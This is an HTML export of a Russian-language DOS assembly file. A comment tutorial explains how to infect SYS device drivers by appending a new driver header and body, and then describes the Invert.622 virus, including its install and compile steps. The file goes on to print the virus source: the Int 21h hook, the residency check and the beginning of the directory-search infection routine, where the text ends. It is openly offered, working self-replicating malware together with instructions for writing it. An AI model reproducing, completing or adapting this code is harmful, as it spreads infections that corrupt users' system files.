<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; 1 - включить отладочный режим</span><span class="sc0">
        </span><span class="sc1">; 0 - выключить отладочный режим</span><span class="sc0">

</span><span class="sc1">; COMMENT %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Simple SYS virus. Infects DOS drivers by adding of new driver</span><span class="sc0">
</span><span class="sc1">;   to the end of file and correcting of header of SYS-file.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Здорово, народ. Сегодня я хочу рассказать об одном типе исполняемых файлов</span><span class="sc0">
</span><span class="sc1">; для DOS, о котором больше никто рассказывать не хочет (уж сколько я спрашивал -</span><span class="sc0">
</span><span class="sc1">; никто так и не сказал мне ничего вразумительного на эту тем). Итак, SYS файлы</span><span class="sc0">
</span><span class="sc1">; (или, иначе, драйверы): что они из себя представляют, как грузяться в память,</span><span class="sc0">
</span><span class="sc1">; как выполняются и т.п. Сразу хочу предупредить, что не буду распространяться</span><span class="sc0">
</span><span class="sc1">; на те аспекты, которые не касаются вирусов - а то целая книга получится.</span><span class="sc0">
</span><span class="sc1">;    Все драйверы делятся на символьные и блочные. Про блочные я ничего расска-</span><span class="sc0">
</span><span class="sc1">; зывать не буду. В начале SYS файла расположен небольшой заголовок. Вот его фор-</span><span class="sc0">
</span><span class="sc1">; мат:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   +00h   1w   Смещение следующего заголовка (от начала файла). Если это послед-</span><span class="sc0">
</span><span class="sc1">;               ний заголовок, то здесь должно стоять FFFF.</span><span class="sc0">
</span><span class="sc1">;   +02h   1w   Сегмент следующего заголовка. Если это последний заголовок, то</span><span class="sc0">
</span><span class="sc1">;               здесь должно стоять FFFF. Если не последний, то 0000.</span><span class="sc0">
</span><span class="sc1">;   +04h   1w   Атрибуты драйвера. Для наших целей здесь лучше всего ставить</span><span class="sc0">
</span><span class="sc1">;               8000h - символьный драйвер нестандартного устройства.</span><span class="sc0">
</span><span class="sc1">;   +06h   1w   Смещение процедуры стратегий (от начала файла).</span><span class="sc0">
</span><span class="sc1">;   +08h   1w   Смещение процедуры прерываний (от начала файла).</span><span class="sc0">
</span><span class="sc1">;   +0Ah   8b   Имя драйвера (для символьных устройств).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Как видно из таблицы, в одном SYS файле может содержаться несколько драй-</span><span class="sc0">
</span><span class="sc1">; веров. Сначала DOS инициализирует первый драйвер, затем второй и т.д. Вот это</span><span class="sc0">
</span><span class="sc1">; мы и будем использовать. Чтобы заразить SYS файл, нужно сгенерировать свой</span><span class="sc0">
</span><span class="sc1">; заголовок, дописать его к концу файла, затем туда же дописать сам вирус и в</span><span class="sc0">
</span><span class="sc1">; конце концов первые 4 байта файла заменить на дальний адрес нашего заголовка</span><span class="sc0">
</span><span class="sc1">; (сегмент будет равен нулю, а смещение - длине файла). Как сгенерировать свой</span><span class="sc0">
</span><span class="sc1">; заголовок? Первые два поля должны содержать то же значение, что и первые два</span><span class="sc0">
</span><span class="sc1">; поля исходного файла-жертвы. Атрибуты, как уже было сказано, нужно поставить</span><span class="sc0">
</span><span class="sc1">; 8000h. Следующие два поля прийдется вычислить, исходя из длины заражаемого</span><span class="sc0">
</span><span class="sc1">; файла. Имя драйвера можно поставить любое. Размер результирующего SYS файла не</span><span class="sc0">
</span><span class="sc1">; должен превышать 64Kb.</span><span class="sc0">
</span><span class="sc1">;    SYS файл грузится в память полностью, вместе с заголовком. Для SYS файлов</span><span class="sc0">
</span><span class="sc1">; никогда не создается PSP. При загрузке драйверов в память DOS изменяет первые</span><span class="sc0">
</span><span class="sc1">; два поля их заголовков: ставит там дальний указатель на следующий драйвер -</span><span class="sc0">
</span><span class="sc1">; выстраивает их в цепочку (для своих целей). После этого драйверы становятся</span><span class="sc0">
</span><span class="sc1">; частью операционной системы.</span><span class="sc0">
</span><span class="sc1">;    При загрузке драйвера DOS сначала передает управление процедуре стратегий.</span><span class="sc0">
</span><span class="sc1">; Единственное, что ей нужно сделать - это сохранить где-нибудь в надежном месте</span><span class="sc0">
</span><span class="sc1">; регистры ES:BX. В этих регистрах хранится адрес запроса, который формирует DOS</span><span class="sc0">
</span><span class="sc1">; для обращения к драйверу, но об этом ниже.</span><span class="sc0">
</span><span class="sc1">;    Затем управление получает процедура прерываний. Замечу, что эта процедура не</span><span class="sc0">
</span><span class="sc1">; имеет ничего общего с процедурой обработки прерываний - просто у нее название</span><span class="sc0">
</span><span class="sc1">; такое. В первую очередь надо разныкать сохраненные ES:BX. В запросе находится</span><span class="sc0">
</span><span class="sc1">; номер команды, которую должен выполнить драйвер (для нас важна только команда</span><span class="sc0">
</span><span class="sc1">; инициализации), и поля, в которые нужно записать результат выполнения этой ко-</span><span class="sc0">
</span><span class="sc1">; манда. Если у нас в атрибутах стоит 8000h (см. выше), то процедура прерываний</span><span class="sc0">
</span><span class="sc1">; получит управление только один раз - в момент загрузки драйвера в память. Вот</span><span class="sc0">
</span><span class="sc1">; формат запроса, который сформирует DOS для этого случая (звездочкой помечены</span><span class="sc0">
</span><span class="sc1">; поля, которые будут нас интересовать):</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   ES:[BX+00h]   1b   Длина запроса.</span><span class="sc0">
</span><span class="sc1">;   ES:[BX+01h]   1b   Номер устройства (для блочных устройств).</span><span class="sc0">
</span><span class="sc1">; * ES:[BX+02h]   1b   Команда, которую нужно выполнить. Команда инициализации</span><span class="sc0">
</span><span class="sc1">;                      имеет код 0. Формат запроса, приведенного здесь, именно</span><span class="sc0">
</span><span class="sc1">;                      для этой команды.</span><span class="sc0">
</span><span class="sc1">; * ES:[BX+03h]   1w   Слово состояния. Сюда мы должны записать результат выпол-</span><span class="sc0">
</span><span class="sc1">;                      нения команды (см. дальше)</span><span class="sc0">
</span><span class="sc1">;   ES:[BX+05h]   8b   Зарезервировано.</span><span class="sc0">
</span><span class="sc1">;   ES:[BX+0Dh]   1b   Кол-во обслуживаемых устройств (для блочных драйверов).</span><span class="sc0">
</span><span class="sc1">; * ES:[BX+0Eh]   2w   Здесь нужно указать дальний адрес конца того кода, который</span><span class="sc0">
</span><span class="sc1">;                      мы хотим оставить резидентным (см. дальше).</span><span class="sc0">
</span><span class="sc1">;   ES:[BX+12h]   2w   Дальний адрес строки параметров (все, что следует за</span><span class="sc0">
</span><span class="sc1">;                      строкой "DEVICE=" из CONFIG.SYS).</span><span class="sc0">
</span><span class="sc1">;   ES:[BX+16h]   1b   Номер устройства, обслуживаемого драйвером (назначается</span><span class="sc0">
</span><span class="sc1">;                      DOS-ом).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Формат слова состояния:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; *   0-7  Код ошибки. Это поле действительно, если установлен бит 15.</span><span class="sc0">
</span><span class="sc1">; *     8  Команда выполнена. Этот бит нужно устанавливать перед возвратом</span><span class="sc0">
</span><span class="sc1">;          управления DOS-у.</span><span class="sc0">
</span><span class="sc1">;       9  Устройство занято.</span><span class="sc0">
</span><span class="sc1">;   10-14  Зарезервировано.</span><span class="sc0">
</span><span class="sc1">; *    15  Признак ошибки.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Возможные коды ошибок:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   00h   попытка записи на защищенное устройство.</span><span class="sc0">
</span><span class="sc1">;   01h   неизвестное устройство.</span><span class="sc0">
</span><span class="sc1">;   02h   устройство не готово.</span><span class="sc0">
</span><span class="sc1">; * 03h   неизвестная команда.</span><span class="sc0">
</span><span class="sc1">;   04h   CRC error.</span><span class="sc0">
</span><span class="sc1">;   05h   неправильная длина запроса.</span><span class="sc0">
</span><span class="sc1">;   06h   дорожка не найдена.</span><span class="sc0">
</span><span class="sc1">;   07h   неизвестный носитель данных.</span><span class="sc0">
</span><span class="sc1">;   08h   сектор не найден.</span><span class="sc0">
</span><span class="sc1">;   09h   нет бумаги в принтере.</span><span class="sc0">
</span><span class="sc1">;   0Ah   ошибка записи.</span><span class="sc0">
</span><span class="sc1">;   0Bh   ошибка чтения.</span><span class="sc0">
</span><span class="sc1">;   0Ch   общая ошибка.</span><span class="sc0">
</span><span class="sc1">;   0Dh   зарезервировано.</span><span class="sc0">
</span><span class="sc1">;   0Eh   зарезервировано.</span><span class="sc0">
</span><span class="sc1">;   0Fh   неразрешенная замена диска.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Итак, мы (процедура прерываний) получили управление. В первую очередь нужно</span><span class="sc0">
</span><span class="sc1">; проверить, какую команду требуется выполнить. Если это НЕ команда инициализа-</span><span class="sc0">
</span><span class="sc1">; ции, то устанавливаем слово состояния в 8103h (неизвестная команда) и выходим.</span><span class="sc0">
</span><span class="sc1">; Теперь выделяем память. Для этого в ячейку ES:[BX+0Eh] нужно занести смещение</span><span class="sc0">
</span><span class="sc1">; последнего байта вируса + 1, а в ячейку ES:[BX+10h] - значение CS. Затем нужно</span><span class="sc0">
</span><span class="sc1">; проверить, не присутствует ли в памяти другая копия вируса. Если нет, то пере-</span><span class="sc0">
</span><span class="sc1">; хватить Int 21h (или еще что-нибудь). Ну а если присутствует? Даже в этом слу-</span><span class="sc0">
</span><span class="sc1">; чае память все равно прийдется выделять (поэтому мы и сделали это ДО проверки</span><span class="sc0">
</span><span class="sc1">; присутствия другой копии в памяти) - и в этом состоит один из глюков такого</span><span class="sc0">
</span><span class="sc1">; метода заражения SYS файлов. Ну, допустим, мы сделали все вышеописанное и пере-</span><span class="sc0">
</span><span class="sc1">; хватили нужные нам прерывания. Теперь остается только установить слово состо-</span><span class="sc0">
</span><span class="sc1">; яния в 100h (удачное завершение) и отдать управление DOS-у.</span><span class="sc0">
</span><span class="sc1">;    Вот, пожалуй, и все. Правда, у такого метода заражения есть еще один глюк:</span><span class="sc0">
</span><span class="sc1">; прежде чем мы получим управление, произойдет инициализация драйвера, который</span><span class="sc0">
</span><span class="sc1">; стоит раньше нас (в начале файла). Если этот драйвер запишет что-нибудь в об-</span><span class="sc0">
</span><span class="sc1">; ласть кода вируса, то последствия будут не самые лучшие. К счастью так делают</span><span class="sc0">
</span><span class="sc1">; лишь немногие драйверы, поэтому на это можно забить, хотя бороться с этим никак</span><span class="sc0">
</span><span class="sc1">; нельзя.</span><span class="sc0">
</span><span class="sc1">;    Справедливости ради скажу, что есть еще один метод заражения SYS файлов.</span><span class="sc0">
</span><span class="sc1">; Нужно переставить на себя адрес процедуры стратегий (или прерываний) самого</span><span class="sc0">
</span><span class="sc1">; первого драйвера в файле. При получении управления перегнать себя, например,</span><span class="sc0">
</span><span class="sc1">; в видеопамять (MCB пока пользоваться нельзя), подождать загрузки системы, а</span><span class="sc0">
</span><span class="sc1">; затем уже разместить себя в памяти по-нормальному. Что же касается первого ме-</span><span class="sc0">
</span><span class="sc1">; тода - он хоть и глючный, зато более интересный с точки зрения изучения воз-</span><span class="sc0">
</span><span class="sc1">; можностей DOS-а. Для лучшего его понимания предлагаю посмотреть нижеследующий</span><span class="sc0">
</span><span class="sc1">; вирус. Вот его небольшое описание:</span><span class="sc0">
</span><span class="sc1">;    Вирус заражает SYS файлы при чтении каталогов, даписываясь в их конец в</span><span class="sc0">
</span><span class="sc1">; качестве нового драйвера. Проверка типа файла происходит как по расширению, так</span><span class="sc0">
</span><span class="sc1">; и по первым четырем байтам. Корректно заражает SYS файлы для Windows - ENUNS,</span><span class="sc0">
</span><span class="sc1">; RUSNS и т.п. Признак зараженности файла - 62 секунды в поле времени создания.</span><span class="sc0">
</span><span class="sc1">; Обрабатывает файлы с атрибутом "Read Only". Не изменяет атрибуты файла и время</span><span class="sc0">
</span><span class="sc1">; его создания (за исключением секунд). Не глючит на защищенных от записи диске-</span><span class="sc0">
</span><span class="sc1">; тах. Есть отладочный режим, при котором вирус заражает только файлы с расшире-</span><span class="sc0">
</span><span class="sc1">; нием ZZZ. 18 мая при заражении каждого файла вирус переворачивает все буквы</span><span class="sc0">
</span><span class="sc1">; кроме псевдографики, за что и получил свое название (Invert.622). Замеченные</span><span class="sc0">
</span><span class="sc1">; глюки:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    1. После загрузки Windows вирус перестает функционировать. Ничего удиви-</span><span class="sc0">
</span><span class="sc1">;       тельного в этом нет - от Windows всего можно ожидать.</span><span class="sc0">
</span><span class="sc1">;    2. Если в обработчике Int 21h не сохранять флаги (хотя они и так должны</span><span class="sc0">
</span><span class="sc1">;       сохраняться командой INT), то могут проглючить некоторые программы, за-</span><span class="sc0">
</span><span class="sc1">;       пускаемые из AUTOEXEC.BAT. Возможно, это связано с тем, что у меня уста-</span><span class="sc0">
</span><span class="sc1">;       новлен EMM386, который грузит компьютер в V86, а прерывания обработывает</span><span class="sc0">
</span><span class="sc1">;       сначала сам.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Для установки вируса в систему скопируйте INVERT.SYS, например, в корневой</span><span class="sc0">
</span><span class="sc1">; каталог и добавьте в CONFIG.SYS строку "DEVICE=C:\INVERT.SYS".</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                   DJ Sadovnikov (http://i.am/djsad), 18.05.2000</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;           Компилировать с помощью TASM 4.1+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;              tasm /m invert.asm</span><span class="sc0">
</span><span class="sc1">;              tlink /x invert.obj</span><span class="sc0">
</span><span class="sc1">;              exe2bin invert.exe invert.sys</span><span class="sc0">
</span><span class="sc1">;              del invert.obj</span><span class="sc0">
</span><span class="sc1">;              del invert.exe</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;           Файлы из архива:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;              invert.asm  15800 (исходник вируса)</span><span class="sc0">
</span><span class="sc1">;              invert.sys    622 (бинарник вируса)</span><span class="sc0">
</span><span class="sc1">; %</span><span class="sc0">









</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">Code</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">8000h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Strategy</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Interrupt</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'XXXXXX$$'</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Strategy</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">StrEntry</span><span class="sc0">
</span><span class="sc5">StrEntry</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc5">StrEntry</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc5">StrEntry</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Interrupt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IntEntry</span><span class="sc0">
</span><span class="sc5">IntEntry</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">


</span><span class="sc1">;[Это инициализация драйвера?]</span><span class="sc0">

        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">-</span><span class="sc5">IntEntry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8103h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Выделяем память для вируса]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EndVir</span><span class="sc4">-</span><span class="sc5">IntEntry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">


</span><span class="sc1">;[Проверяем наличие вируса в памяти]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDABh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Переустанавливаем Int 21h на Int 65h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2565h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем вирус на Int 21h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Int21h</span><span class="sc4">-</span><span class="sc5">IntEntry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">VirName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Invert.622 -- Copyright (c) by DJ Sadovnikov'</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Int24h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc5">Int21h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotTest</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc5">NotTest</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">DirSearch</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">DirSearch</span><span class="sc0">

        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">QuitSTC</span><span class="sc0">

</span><span class="sc5">QuitCLC</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">11111110b</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">QuitSTC</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">DirSearch</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">QuitSTC</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Вычисляем точку входа]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Entry</span><span class="sc0">
</span><span class="sc5">Entry</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">


</span><span class="sc1">;[Сохраняем адрес обработчика Int 24h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3524h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем свой обработчик Int 24h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Int24h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Получаем адрес DTA]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
